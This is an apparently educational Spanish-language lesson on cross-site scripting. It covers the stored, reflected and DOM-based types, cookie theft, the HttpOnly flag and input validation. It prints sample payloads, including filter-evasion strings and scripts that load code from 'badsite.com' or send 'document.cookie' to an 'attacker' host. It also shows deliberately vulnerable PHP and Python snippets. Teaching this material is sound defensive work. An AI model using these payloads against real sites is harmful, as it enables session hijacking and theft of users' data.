---
title: "XSS (secuencias de comandos entre sitios)"
subtitle: "Dominando todo sobre Cross-site scripting"
tags: ["pentesting", "ciberseguridad", "equipo rojo"]
authors: ["blindma1den", "lorenagubaira"]

---

Cross-site scripting (XSS) es un tipo de vulnerabilidad de seguridad que permite a un atacante inyectar c√≥digo malicioso en una p√°gina web vista por otros usuarios. El complemento no desinfecta y escapa a algunas de sus opciones emergentes, lo que podr√≠a permitir a los usuarios con un rol tan bajo como Colaborador realizar ataques de secuencias de comandos entre sitios almacenados, que podr√≠an usarse contra los administradores.

Las vulnerabilidades de "cross-site scripting" se producen cuando la falta de validaci√≥n de entradas permite a los usuarios inyectar c√≥digo de script en el sitio web de destino de forma que se ejecute en el navegador de otro usuario que est√© visitando el mismo sitio web. Esto eludir√≠a la pol√≠tica de mismo origen del navegador, ya que √©ste no tiene forma de distinguir el c√≥digo de script aut√©ntico del no aut√©ntico, aparte de su origen.

Seg√∫n el an√°lisis de Wordfence las vulnerabilidades de Cross Site Scripting son la vulnerabilidad m√°s com√∫n que se encuentra en los complementos de WordPress por un margen significativo.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

Como puede ver en el gr√°fico anterior, si puede comprender completamente y eliminar solo las vulnerabilidades XSS en su c√≥digo PHP, escribir√° un 47% menos de vulnerabilidades. As√≠ que dediquemos un tiempo a analizar XSS, qu√© es, c√≥mo se explota y c√≥mo prevenir las vulnerabilidades de XSS.

Muchas aplicaciones web tienen vectores de entrada con los que los usuarios pueden interactuar. Cuando esas entradas se reflejan en el contenido de una p√°gina y no se desinfectan o filtran lo suficiente, los atacantes pueden intentar inyectar c√≥digo malicioso para alterar esa p√°gina. Los ataques m√°s comunes que aprovechan estas vulnerabilidades son XSS (Cross-Site Scripting) y ataques de desfiguraci√≥n. Si bien este tipo de desfiguraci√≥n solo altera la apariencia visual de un sitio web, un XSS puede permitir a los atacantes inyectar c√≥digo/scripts (JavaScript, por ejemplo) que ser√°n ejecutados por los navegadores de las v√≠ctimas, causando as√≠ muchos m√°s problemas a los usuarios.

La ejecuci√≥n de c√≥digo arbitrario en el navegador de una v√≠ctima puede permitir a un atacante realizar **el robo de cookies** (cuando las cookies no est√°n protegidas, los atacantes pueden robarlas y usarlas para autenticarse como v√≠ctimas sin tener que conocer su contrase√±a), **registro de teclas** (los atacantes pueden espiar el v√≠ctimas y recuperar sus pulsaciones de teclas) o **Phishing** (los atacantes pueden cambiar la apariencia y el comportamiento del sitio y enga√±ar a las v√≠ctimas para que env√≠en informaci√≥n confidencial a los servidores de los atacantes).

### ¬øPero, qu√© es una vulnerabilidad XSS?

Las vulnerabilidades XSS son incre√≠blemente f√°ciles de escribir. De hecho, si simplemente escribe PHP de una manera que parezca intuitiva, es casi seguro que escribir√° una vulnerabilidad XSS en su c√≥digo. Afortunadamente, las vulnerabilidades XSS tambi√©n son muy f√°ciles de reconocer.

| 1 | echo "The value you entered is: " . $_GET['val']; |

Esa es una vulnerabilidad XSS cl√°sica. Si incluye este c√≥digo en un complemento de WordPress, lo publica y su complemento se vuelve popular, no puede tener dudas de que un analista de seguridad en alg√∫n momento se comunicar√° con usted para informarle esta vulnerabilidad. Tendr√°s que arreglarlo y el analista lo har√° p√∫blico, dej√°ndote un poco avergonzado, pero con una aplicaci√≥n m√°s segura.

Entonces, ¬øpor qu√© se trata de una vulnerabilidad XSS? La forma en que funciona el c√≥digo anterior es que toma un valor de la URL y lo vuelve a escribir en el navegador, sin validar ni filtrar. Si su aplicaci√≥n est√° alojada en [https://example.com/test.php](https://example.com/test.php), un visitante del sitio podr√≠a visitar la siguiente URL:

> https://ejemplo.com/test.php?val=123

Luego ver√°n: "El valor que ingres√≥ es: 123" en su navegador. Probablemente la forma en que se dise√±√≥ la aplicaci√≥n para funcionar.

Si alguien visita la siguiente URL:

> https://example.com/test.php?val=<script>alert('Prueba que esto es un XSS');</script>

Ver√°n lo siguiente en el navegador: "El valor que ingres√≥ es:" y tambi√©n ver√°n un cuadro de alerta emergente que dice "Prueba que esto es un XSS".

### ¬øPor qu√© es peligrosa la salida sin filtrar?

Una demostraci√≥n que muestra un cuadro de alerta no parece una gran amenaza. Si no comprende completamente el impacto de una vulnerabilidad XSS y alguien le informa este problema con un cuadro de `alerta()` como demostraci√≥n de la vulnerabilidad, es posible que no se lo tome en serio. ¬øC√≥mo puede la prueba de que puede ejecutar JavaScript ser una prueba de un problema de seguridad grave?

Cuando un analista le env√≠a un cuadro de alerta() como prueba de una vulnerabilidad de seguridad, est√° demostrando que puede ejecutar c√≥digo JavaScript arbitrario en el navegador. Lo que realmente est√°n demostrando es que al enviar esa URL a otra persona, pueden lograr que esa otra persona ejecute javascript arbitrario en un navegador.

### Una versi√≥n de un exploit podr√≠a verse as√≠

[https://example.com/test.php?val=<script](https://example.com/test.php?val=%3cscript) src=‚Äùhttp://badsite.com/badscript.js‚Äù></script>

El atacante enviar√° ese enlace a una v√≠ctima. Los pasos son los siguientes:

- La v√≠ctima hace clic en el enlace y visita el sitio. Supongamos que ya han iniciado sesi√≥n en el sitio web con acceso de nivel de administrador.
- El enlace y la vulnerabilidad XSS hacen que el script se cargue desde un sitio web externo a la p√°gina web de destino.
- El script tendr√° acceso completo al entorno DOM del navegador, incluida cualquier cookie HTTP que no est√© protegida por el indicador HttpOnly.
- El script realiza una acci√≥n maliciosa como usuario que ha iniciado sesi√≥n. Tambi√©n roba datos del sitio web al que puede acceder el usuario que ha iniciado sesi√≥n (por ejemplo, mensajes privados que el usuario ha recibido) y los env√≠a al atacante. Los datos se pueden enviar de varias maneras, pero una podr√≠a ser cargar una imagen como esta desde un sitio web externo: [http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues](http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues). badPretendImage.jpg es en realidad un script que muestra una imagen pero tambi√©n almacena los datos recibidos.

Ese es el mecanismo b√°sico de explotaci√≥n de una vulnerabilidad XSS: un atacante encuentra una manera de hacer que una v√≠ctima cargue su javascript utilizando una vulnerabilidad XSS en el sitio web. Lo usan para robar datos de los navegadores.

En el ejemplo anterior, hemos cargado un archivo javascript externo en la p√°gina. Las vulnerabilidades XSS var√≠an y, para una vulnerabilidad particular, puede que no sea factible incluir etiquetas <SCRIPT> que carguen un script externo completo. Si eso no funciona, lo que podr√≠a funcionar es agregar javascript directamente en el exploit que se ejecuta y realiza alguna acci√≥n maliciosa.

### ¬øQu√© es la bandera HttpOnly y por qu√© es importante?

Antes de la versi√≥n 6SP1 de Internet Explorer, las cookies eran accesibles tanto para los servidores web cuando un navegador realizaba una solicitud como para JavaScript. En otras palabras, un script que se ejecuta en el navegador de un sitio web en particular podr√≠a simplemente leer todas las cookies que el sitio web haya configurado.

Esto proporcion√≥ mucha flexibilidad a los desarrolladores, pero tambi√©n permiti√≥ que scripts maliciosos leyeran los valores de las cookies y los enviaran a cualquier lugar de Internet. Si un atacante pudiera explotar una vulnerabilidad XSS, lo primero que har√≠a ser√≠a robar todas las cookies que pudiera leer. Esto les permitir√≠a obtener acceso instant√°neo a nivel administrativo a sitios web si la v√≠ctima hubiera iniciado sesi√≥n en el sitio web de destino como administrador.

En 2002, Microsoft lanz√≥ una funci√≥n con Internet Explorer Service Pack 1 que proporcionaba un indicador especial opcional que pod√≠a configurarse cuando se configuraba una cookie. El indicador se llama HttpOnly y especifica que cualquier cookie que incluya el indicador HttpOnly no debe ser legible por javascript y solo debe enviarse al servidor web que configur√≥ la cookie a trav√©s de HTTP. De ah√≠ el nombre 'HttpOnly'. Otros proveedores de navegadores adoptaron r√°pidamente la funci√≥n porque los beneficios de seguridad eran claros. Esta bandera proporcion√≥ una forma s√≥lida de proteger las cookies confidenciales de ataques XSS. Hoy en d√≠a, todos los principales proveedores de navegadores admiten la bandera HttpOnly.

WordPress tambi√©n utiliza el indicador HttpOnly para proteger las cookies, lo que evita que un atacante que aproveche una vulnerabilidad XSS robe cookies confidenciales.

Consejo: Cambiar la contrase√±a de un usuario de WordPress invalida sus cookies inmediatamente. Esto se puede utilizar para cerrar la sesi√≥n de un usuario en caso de sospecha de infracci√≥n.

### Consecuencias

Esto puede permitir al atacante robar informaci√≥n confidencial, como credenciales de inicio de sesi√≥n o datos personales, o realizar acciones en nombre de la v√≠ctima, como realizar transacciones no autorizadas o publicar spam.

El XSS almacenado, en particular, ocurre cuando el c√≥digo malicioso se almacena permanentemente en el sitio web, lo que le permite afectar a cualquier usuario que visite la p√°gina afectada. Las consecuencias pueden incluir p√©rdidas financieras, filtraciones de datos o da√±os a la reputaci√≥n del sitio web.

Las principales consecuencias de XSS son:

- **Robo de informaci√≥n:** Un atacante puede robar informaci√≥n confidencial del usuario, como credenciales de inicio de sesi√≥n, informaci√≥n bancaria o datos personales.
- **Ataques de phishing**: Se puede utilizar XSS para enga√±ar a los usuarios para que proporcionen informaci√≥n personal o confidencial, como contrase√±as o n√∫meros de tarjetas de cr√©dito.
- **Manipulaci√≥n del contenido:** Tambi√©n puede ser utilizado para manipular el contenido de un sitio web, por ejemplo, para mostrar mensajes falsos, redireccionar a los usuarios a sitios maliciosos o incluso para cambiar la apariencia del sitio web.
- **Robo de sesiones:** Es posible inyectar c√≥digo malicioso que intercepte la sesi√≥n de un usuario, lo que le permite realizar acciones en nombre del usuario.
- **Difusi√≥n de malware:** Tambi√©n un atacante puede utilizar XSS para inyectar c√≥digo malicioso que descarga y ejecuta malware en el equipo del usuario sin su conocimiento o consentimiento.
- El impacto exacto depende en gran medida de la aplicaci√≥n.
- XSS es generalmente una amenaza para las aplicaciones web que tienen usuarios autenticados o que son sensibles a la seguridad.
- El c√≥digo malicioso puede ser capaz de manipular el contenido del sitio, cambiando su apariencia y/o funci√≥n para otro usuario.
- Esto incluye modificar el comportamiento de la aplicaci√≥n web (como redirigir formularios, etc.).
- El c√≥digo tambi√©n puede ser capaz de realizar acciones dentro de la aplicaci√≥n sin conocimiento del usuario.
- El c√≥digo script tambi√©n puede obtener y retransmitir los valores de las cookies si no han sido configuradas como HttpOnly.

### Hay 3 tipos principales de XSS

- **Almacenado**: la entrada del usuario se almacena en el sitio web. Suele ocurrir en perfiles de usuario, foros, chats, etc., donde el contenido del usuario se almacena de forma permanente (o temporal). Los atacantes pueden inyectar cargas √∫tiles maliciosas y todos los usuarios que naveguen por la p√°gina infectada se ver√°n afectados. Esta es una de las formas m√°s peligrosas de XSS porque la explotaci√≥n no requiere phishing y puede afectar a muchos usuarios. Los XSS en p√°ginas en las que solo el usuario del atacante tiene derecho a navegar (por ejemplo, la p√°gina de configuraci√≥n del usuario) se denominan self-XSS y se considera que tienen un impacto cercano a 0, ya que te√≥ricamente no puede afectar a otros usuarios.
- **Reflejado**: la entrada del usuario se refleja pero no se almacena. Suele ocurrir en formularios de b√∫squeda, p√°ginas de inicio de sesi√≥n y p√°ginas que reflejan contenido para una sola respuesta. Cuando la entrada vulnerable reflejada est√° en el URI ([http://www.target.com/search.php?keyword=INJECTION](http://www.target.com/search.php?keyword=INJECTION)), los atacantes pueden crear un URI malicioso y enviarlo a las v√≠ctimas con la esperanza de que lo exploren. Esta forma de XSS generalmente requiere phishing y los atacantes pueden limitar la longitud de la carga maliciosa.
- **Basado en DOM** : mientras que los ataques XSS almacenados y reflejados explotan vulnerabilidades en el c√≥digo del lado del servidor, un XSS basado en DOM explota las del lado del cliente (por ejemplo, JavaScript utilizado para ayudar a representar din√°micamente una p√°gina). Los XSS basados ‚Äã‚Äãen DOM generalmente afectan las entradas del usuario que se reflejan temporalmente, al igual que los ataques XSS reflejados.

## Pr√°ctica:

Los evaluadores deben identificar los vectores de entrada (partes de la aplicaci√≥n que aceptan contenido de los usuarios) que se almacenan o reflejan.

- Par√°metros de URI para XSS reflejado y basado en DOM
- Otras entradas de usuarios en foros, chats, comentarios, publicaciones y otro contenido almacenado para XSS almacenado
- Encabezados HTTP como cookies (e incluso agentes de usuario en algunos casos)

Una de las cargas √∫tiles m√°s famosas es <script>alert('XSS');</script>abrir una ventana emergente que hace eco de "XSS". Sin embargo, explotar XSS es como jugar al "gato y al rat√≥n". Las entradas se pueden filtrar y los filtros se pueden omitir. A continuaci√≥n se muestran algunos ejemplos b√°sicos de cargas √∫tiles XSS.

```html
<script>alert('XSS');</script>

<IMG SRC=JaVaScRiPt:alert('XSS')>

<IMG onmouseover="alert('XSS')">

<<SCRIPT>alert("XSS");//<</SCRIPT>
```

> El siguiente [sitio web](https://transformations.jobertabma.nl/) ([proyecto GitHub](https://github.com/jobertabma/transformations)) puede ayudar a identificar las transformaciones aplicadas a las entradas de los usuarios. Esto puede ayudar a eludir filtros y transformaciones para aprovechar los ataques XSS.

La siguiente carga √∫til se utiliza para probar inyecciones de SQL , XSS (Cross-Site Scripting) y SSTI (Inyecci√≥n de plantilla del lado del servidor).

```html
'"<svg/onload=prompt(5);>{{7*7}}
```

Herramientas como [XSStrike](https://github.com/s0md3v/XSStrike) (Python) y [XSSer](https://github.com/epsylon/xsser) (Python) tambi√©n pueden ayudar a encontrar y explotar vectores de entrada vulnerables XSS al fusionarlos con cargas √∫tiles √∫nicas y luego buscar patrones √∫nicos en las respuestas.

‚ÄãEl atacante no apunta directamente a su v√≠ctima. En cambio, explota una vulnerabilidad en un sitio web que visita la v√≠ctima, para que el sitio web le entregue el JavaScript malicioso. Para el navegador de la v√≠ctima, el JavaScript malicioso parece ser una parte leg√≠tima del sitio web y, por lo tanto, el sitio web ha actuado como c√≥mplice involuntario del atacante.

# C√≥mo se inyecta el JavaScript malicioso

La √∫nica forma que tiene el atacante de ejecutar su JavaScript malicioso en el navegador de la v√≠ctima es inyectarlo en una de las p√°ginas que la v√≠ctima descarga del sitio web. Esto puede suceder si el sitio web incluye directamente la entrada del usuario en sus p√°ginas, porque el atacante puede insertar una cadena que el navegador de la v√≠ctima tratar√° como c√≥digo.

En el siguiente ejemplo, se utiliza un script simple del lado del servidor para mostrar el √∫ltimo comentario en un sitio web:

```python
print "<html>"

print "Latest comment:"

print database.latestComment

print "</html>"
```

El script supone que un comentario consta √∫nicamente de texto. Sin embargo, dado que la entrada del usuario se incluye directamente, un atacante podr√≠a enviar este comentario: " <script>...</script>". Cualquier usuario que visite la p√°gina recibir√° ahora la siguiente respuesta:

```html
<html>

Latest comment:

<script>...</script>

</html>
```

Cuando el navegador del usuario carga la p√°gina, ejecutar√° cualquier c√≥digo JavaScript contenido dentro de las <script> etiquetas. El atacante ahora ha tenido √©xito con su ataque.

## ¬øQu√© es JavaScript malicioso?

Al principio, la capacidad de ejecutar JavaScript en el navegador de la v√≠ctima puede no parecer particularmente maliciosa. Despu√©s de todo, JavaScript se ejecuta en un entorno muy restringido que tiene un acceso extremadamente limitado a los archivos y al sistema operativo del usuario. De hecho, podr√≠a abrir la consola JavaScript de su navegador ahora mismo y ejecutar cualquier JavaScript que desee, y ser√≠a muy poco probable que cause alg√∫n da√±o a su computadora.

Sin embargo, la posibilidad de que JavaScript sea malicioso se vuelve m√°s clara cuando se consideran los siguientes hechos:

- JavaScript tiene acceso a parte de la informaci√≥n confidencial del usuario, como las cookies.
- JavaScript puede enviar solicitudes HTTP con contenido arbitrario a destinos arbitrarios mediante el uso XMLHttpRequestde otros mecanismos.
- JavaScript puede realizar modificaciones arbitrarias al HTML de la p√°gina actual utilizando m√©todos de manipulaci√≥n DOM.

Estos hechos combinados pueden provocar fallos de seguridad muy graves, como explicaremos a continuaci√≥n.

### Las consecuencias del JavaScript malicioso

Entre muchas otras cosas, la capacidad de ejecutar JavaScript arbitrario en el navegador de otro usuario permite a un atacante realizar los siguientes tipos de ataques:

### Robo de cookies

El atacante puede acceder a las cookies de la v√≠ctima asociadas con el sitio web mediante document.cookie, enviarlas a su propio servidor y utilizarlas para extraer informaci√≥n confidencial como ID de sesi√≥n.

### Registro de teclas

El atacante puede registrar un detector de eventos de teclado addEventListenery luego enviar todas las pulsaciones de teclas del usuario a su propio servidor, registrando potencialmente informaci√≥n confidencial como contrase√±as y n√∫meros de tarjetas de cr√©dito.

### Suplantaci√≥n de identidad

El atacante puede insertar un formulario de inicio de sesi√≥n falso en la p√°gina mediante manipulaci√≥n DOM, configurar el actionatributo del formulario para que apunte a su propio servidor y luego enga√±ar al usuario para que env√≠e informaci√≥n confidencial.

> üëâ Aunque estos ataques difieren significativamente, todos tienen una similitud crucial: debido a que el atacante ha inyectado c√≥digo en una p√°gina proporcionada por el sitio web, el JavaScript malicioso se ejecuta en el contexto de ese sitio web. Esto significa que se trata como cualquier otro script de ese sitio web: tiene acceso a los datos de la v√≠ctima para ese sitio web (como las cookies) y el nombre de host que se muestra en la barra de URL ser√° el del sitio web. Para todos los efectos, el script se considera una parte leg√≠tima del sitio web, lo que le permite hacer cualquier cosa que el sitio web real pueda hacer.

**Este hecho pone de relieve una cuesti√≥n clave:**

*Si un atacante puede utilizar su sitio web para ejecutar JavaScript arbitrario en el navegador de otro usuario, la seguridad de su sitio web y de sus usuarios se ha visto comprometida.* Para enfatizar este punto, algunos ejemplos de este tutorial omitir√°n los detalles de un script malicioso al mostrar solo <script>...</script>. Esto indica que la mera presencia de un script inyectado por el atacante es el problema, independientemente del c√≥digo espec√≠fico que realmente ejecute el script.

# Actores en un ataque XSS

Antes de describir en detalle c√≥mo funciona un ataque XSS, debemos definir los actores involucrados en un ataque XSS. En general nvolucra a tres actores: **el sitio web** , **la v√≠ctima** y **el atacante** .

- **El sitio web** ofrece p√°ginas HTML a los usuarios que las solicitan. En nuestros ejemplos, est√° ubicado en [http://website/](http://website/).
- **La base de datos del sitio web** es una base de datos que almacena algunas de las entradas del usuario incluidas en las p√°ginas del sitio web.
- **La v√≠ctima** es un usuario normal del sitio web que solicita p√°ginas del mismo a trav√©s de su navegador.
- **El atacante** es un usuario malintencionado del sitio web que pretende lanzar un ataque contra la v√≠ctima explotando una vulnerabilidad XSS en el sitio web.
- **El servidor del atacante** es un servidor web controlado por el atacante con el √∫nico prop√≥sito de robar informaci√≥n confidencial de la v√≠ctima. En nuestros ejemplos, est√° ubicado en [http://attacker/](http://attacker/).

**Un ejemplo de escenario de ataque**

En este ejemplo, asumiremos que el objetivo final del atacante es robar las cookies de la v√≠ctima explotando una vulnerabilidad XSS en el sitio web. Esto se puede hacer haciendo que el navegador de la v√≠ctima analice el siguiente c√≥digo HTML:

```html
<script>

window.location='http://attacker/?cookie='+document.cookie

</script>
```

Este script navega por el navegador del usuario a una URL diferente, lo que activa una solicitud HTTP al servidor del atacante. La URL incluye las cookies de la v√≠ctima como par√°metro de consulta, que el atacante puede extraer de la solicitud cuando llega a su servidor. Una vez que el atacante ha adquirido las cookies, puede utilizarlas para hacerse pasar por la v√≠ctima y lanzar m√°s ataques.

De ahora en adelante, el c√≥digo HTML anterior se denominar√° **cadena maliciosa** o **script malicioso.** Es importante tener en cuenta que la cadena en s√≠ s√≥lo es maliciosa si finalmente se analiza como HTML en el navegador de la v√≠ctima, lo que s√≥lo puede ocurrir como resultado de una vulnerabilidad XSS en el sitio web.

## C√≥mo funciona el ataque

El siguiente diagrama ilustra c√≥mo un atacante puede realizar este ataque de ejemplo:

![XSS2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss2.png?raw=true)

1. El atacante utiliza uno de los formularios del sitio web para insertar una cadena maliciosa en la base de datos del sitio web.
2. La v√≠ctima solicita una p√°gina del sitio web.
3. El sitio web incluye la cadena maliciosa de la base de datos en la respuesta y la env√≠a a la v√≠ctima.
4. El navegador de la v√≠ctima ejecuta el script malicioso dentro de la respuesta y env√≠a las cookies de la v√≠ctima al servidor del atacante.

## Tipos de XSS

Si bien el objetivo de un ataque XSS es siempre ejecutar JavaScript malicioso en el navegador de la v√≠ctima, existen pocas formas fundamentalmente diferentes de lograr ese objetivo. Los ataques XSS suelen dividirse en tres tipos:

- **XSS persistente**, donde la cadena maliciosa se origina en la base de datos del sitio web.
- **XSS reflejado**, donde la cadena maliciosa se origina a partir de la solicitud de la v√≠ctima.
- **XSS basado en DOM**, donde la vulnerabilidad est√° en el c√≥digo del lado del cliente en lugar del c√≥digo del lado del servidor.

> üí° El ejemplo anterior ilustr√≥ un ataque XSS persistente. Ahora describiremos los otros dos tipos de ataques XSS: XSS reflejado y XSS basado en DOM.

### XSS reflejado

En un ataque XSS reflejado, la cadena maliciosa es parte de la solicitud de la v√≠ctima al sitio web. Luego, el sitio web incluye esta cadena maliciosa en la respuesta enviada al usuario. El siguiente diagrama ilustra este escenario:

![XSS3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss3.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la env√≠a a la v√≠ctima.
2. El atacante enga√±a a la v√≠ctima para que solicite la URL del sitio web.
3. El sitio web incluye la cadena maliciosa de la URL en la respuesta.
4. El navegador de la v√≠ctima ejecuta el script malicioso dentro de la respuesta y env√≠a las cookies de la v√≠ctima al servidor del atacante.

**¬øC√≥mo puede tener √©xito el XSS reflejado?**

Al principio, el XSS reflejado puede parecer inofensivo porque requiere que la propia v√≠ctima env√≠e una solicitud que contenga una cadena maliciosa. Dado que nadie se atacar√≠a voluntariamente, no parece haber forma de realizar el ataque.

Resulta que hay al menos dos formas comunes de hacer que una v√≠ctima lance un ataque XSS reflejado contra s√≠ misma:

- Si el usuario se dirige a un individuo espec√≠fico, el atacante puede enviar la URL maliciosa a la v√≠ctima (mediante correo electr√≥nico o mensajer√≠a instant√°nea, por ejemplo) y enga√±arla para que la visite.
- Si el usuario se dirige a un grupo grande de personas, el atacante puede publicar un enlace a la URL maliciosa (en su propio sitio web o en una red social, por ejemplo) y esperar a que los visitantes hagan clic en √©l.

Estos dos m√©todos son similares y ambos pueden tener m√°s √©xito con el uso de un servicio de acortamiento de URL, que enmascara la cadena maliciosa de los usuarios que de otro modo podr√≠an identificarla.

Lo que hemos discutido anteriormente es una vulnerabilidad XSS reflejada. Un ataque XSS reflejado suele ser un enlace que contiene c√≥digo malicioso. Cuando alguien hace clic en ese enlace, se le dirige a un sitio web vulnerable y ese c√≥digo malicioso se "refleja" en su navegador para realizar alguna acci√≥n maliciosa.

Los ataques XSS reflejados son mucho menos peligrosos que las vulnerabilidades XSS almacenadas (ver m√°s abajo) por varias razones:

Los ataques XSS reflejados dependen de que la v√≠ctima realice alg√∫n tipo de acci√≥n mediante la cual visita el sitio web de destino y hace que genere contenido que realiza una acci√≥n maliciosa en su navegador. Esto hace que los ataques XSS reflejados sean muy dif√≠ciles o, a veces, imposibles de automatizar. Cada v√≠ctima debe ser atacada individualmente con un correo electr√≥nico o alg√∫n otro contenido que contenga un enlace malicioso en el que deben hacer clic para ser el objetivo del ataque.

### XSS basado en DOM

XSS basado en DOM es una variante de XSS tanto persistente como reflejado. En un ataque XSS basado en DOM, el navegador de la v√≠ctima no analiza la cadena maliciosa hasta que se ejecuta el JavaScript leg√≠timo del sitio web. El siguiente diagrama ilustra este escenario para un ataque XSS reflejado:

![XSS4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss4.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la env√≠a a la v√≠ctima.
2. El atacante enga√±a a la v√≠ctima para que solicite la URL del sitio web.
3. El sitio web recibe la solicitud, pero no incluye la cadena maliciosa en la respuesta.
4. El navegador de la v√≠ctima ejecuta el script leg√≠timo dentro de la respuesta, lo que provoca que el script malicioso se inserte en la p√°gina.
5. El navegador de la v√≠ctima ejecuta el script malicioso insertado en la p√°gina y env√≠a las cookies de la v√≠ctima al servidor del atacante.

**¬øQu√© hace que XSS basado en DOM sea diferente?**

En los ejemplos anteriores de ataques XSS persistentes y reflejados, el servidor inserta el script malicioso en la p√°gina, que luego se env√≠a como respuesta a la v√≠ctima. Cuando el navegador de la v√≠ctima recibe la respuesta, asume que el script malicioso es parte del contenido leg√≠timo de la p√°gina y lo ejecuta autom√°ticamente durante la carga de la p√°gina como con cualquier otro script.

Sin embargo, en el ejemplo de un ataque XSS basado en DOM, no se inserta ning√∫n script malicioso como parte de la p√°gina; el √∫nico script que se ejecuta autom√°ticamente durante la carga de la p√°gina es una parte leg√≠tima de la p√°gina. El problema es que este script leg√≠timo utiliza directamente la entrada del usuario para agregar HTML a la p√°gina. Debido a que la cadena maliciosa se inserta en la p√°gina usando innerHTML, se analiza como HTML, lo que provoca que se ejecute el script malicioso.

**La diferencia es sutil pero importante:**

- En XSS tradicional, el JavaScript malicioso se ejecuta cuando se carga la p√°gina, como parte del HTML enviado por el servidor.
- En XSS basado en DOM, el JavaScript malicioso se ejecuta en alg√∫n momento despu√©s de que la p√°gina se haya cargado, como resultado de que el JavaScript leg√≠timo de la p√°gina trata la entrada del usuario de forma insegura.

**Por qu√© es importante el XSS basado en DOM**

En el ejemplo anterior, JavaScript no era necesario; el servidor podr√≠a haber generado todo el HTML por s√≠ solo. Si el c√≥digo del lado del servidor estuviera libre de vulnerabilidades, el sitio web estar√≠a a salvo de XSS.

Sin embargo, a medida que las aplicaciones web se vuelven m√°s avanzadas, JavaScript genera una cantidad cada vez mayor de HTML en el lado del cliente en lugar de hacerlo en el servidor. Cada vez que sea necesario cambiar el contenido sin actualizar toda la p√°gina, la actualizaci√≥n debe realizarse mediante JavaScript. En particular, este es el caso cuando una p√°gina se actualiza despu√©s de una solicitud AJAX.

Esto significa que las vulnerabilidades XSS pueden estar presentes no s√≥lo en el c√≥digo del lado del servidor de su sitio web, sino tambi√©n en el c√≥digo JavaScript del lado del cliente de su sitio web. En consecuencia, incluso con un c√≥digo del lado del servidor completamente seguro, el c√≥digo del lado del cliente a√∫n podr√≠a incluir de manera insegura la entrada del usuario en una actualizaci√≥n del DOM despu√©s de que se haya cargado la p√°gina. Si esto sucede, el c√≥digo del lado del cliente ha habilitado un ataque XSS sin que sea culpa del c√≥digo del lado del servidor.

### XSS basado en DOM invisible para el servidor

Existe un caso especial de XSS basado en DOM en el que, para empezar, la cadena maliciosa nunca se env√≠a al servidor del sitio web: cuando la cadena maliciosa est√° contenida en el identificador de fragmento de una URL (cualquier cosa despu√©s del car√°cter #). Los navegadores no env√≠an esta parte de la URL a los servidores, por lo que el sitio web no tiene forma de acceder a ella mediante el c√≥digo del lado del servidor. El c√≥digo del lado del cliente, sin embargo, tiene acceso a √©l y, por lo tanto, puede causar vulnerabilidades XSS si lo maneja de manera insegura.

Esta situaci√≥n no se limita a los identificadores de fragmentos. Otras entradas del usuario que son invisibles para el servidor incluyen nuevas funciones HTML5 como LocalStorage e IndexedDB.

Vulnerabilidades XSS almacenadas (o persistentes)

Un ataque XSS almacenado es mucho m√°s peligroso por dos razones.

> En primer lugar, se puede automatizar un ataque XSS almacenado. Se puede crear un script que visite miles de sitios web, explote una vulnerabilidad en cada sitio y suelte una carga √∫til XSS almacenada.

> **En segundo lugar, las v√≠ctimas de un ataque XSS almacenado no tienen que realizar ninguna otra acci√≥n que no sea visitar el sitio web afectado.** Cualquiera que visite la p√°gina afectada del sitio se convertir√° en v√≠ctima porque el c√≥digo malicioso almacenado se cargar√° en su navegador. Las v√≠ctimas no necesitan realizar ninguna acci√≥n adicional, como hacer clic en un enlace enviado por correo electr√≥nico, para verse afectadas.

Un ataque XSS almacenado ocurre cuando un atacante env√≠a datos maliciosos a un sitio web que est√° almacenado en una base de datos o alg√∫n otro mecanismo de almacenamiento. Luego, cuando otros visitantes del sitio visitan una p√°gina o una URL espec√≠fica, reciben esos datos que ejecutan y realizan alg√∫n tipo de acci√≥n maliciosa. Veamos un ejemplo:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

El c√≥digo anterior es una aplicaci√≥n de libro de visitas muy b√°sica. Tambi√©n es un ejemplo cl√°sico de vulnerabilidad XSS almacenada. Cuando cargue esta aplicaci√≥n, ver√° un formulario que le pedir√° que firme un libro de visitas que se ve as√≠:

![XSS6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss6.png?raw=true)

Una vez que firmes el libro de visitas varias veces, ver√°s algo como esto:

![XSS7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss7.png?raw=true)

Si ingresa algo de javascript en el cuadro de texto de firma que ejecuta un cuadro de alerta, ver√° esto:

![XSS8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss8.png?raw=true)

Lo que sucedi√≥ aqu√≠ es que un invitado ingres√≥ algo de JavaScript en el campo "Firmar" que se ve as√≠:

| 1 | `<script>alert('XSS Expoit worked');</script>` |

El javascript se almacen√≥ y ahora se entrega a todos los visitantes de la p√°gina del libro de visitas. Esta es una **vulnerabilidad XSS almacenada** que tiene un impacto mucho m√°s amplio que una vulnerabilidad XSS reflejada. Puede usarse para robar datos de cada visitante de la p√°gina afectada, no solo de los visitantes que hacen clic en un enlace especialmente dise√±ado. Por esta raz√≥n, las vulnerabilidades XSS almacenadas son mucho m√°s graves que las XSS reflejadas.

Solucionar esta vulnerabilidad es f√°cil validando la entrada y desinfectando y escapando la salida. Apliquemos eso a este script. Revise los cambios a continuaci√≥n.

![XSS9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss9.png?raw=true)

Como puede ver en el ejemplo anterior, estamos validando los datos usando una expresi√≥n regular. Ahora s√≥lo permitimos un peque√±o subconjunto de caracteres en el libro de visitas. Aunque no permitimos etiquetas HTML, ejecutamos los datos a trav√©s de la funci√≥n filter_var() de PHP con el filtro FILTER_SANITIZE_STRING para desinfectar la cadena, lo que eliminar√° cualquier etiqueta que pueda filtrarse debido a un error en nuestro c√≥digo. FILTER_SANITIZE_STRING en realidad elimina cualquier etiqueta que encuentre.

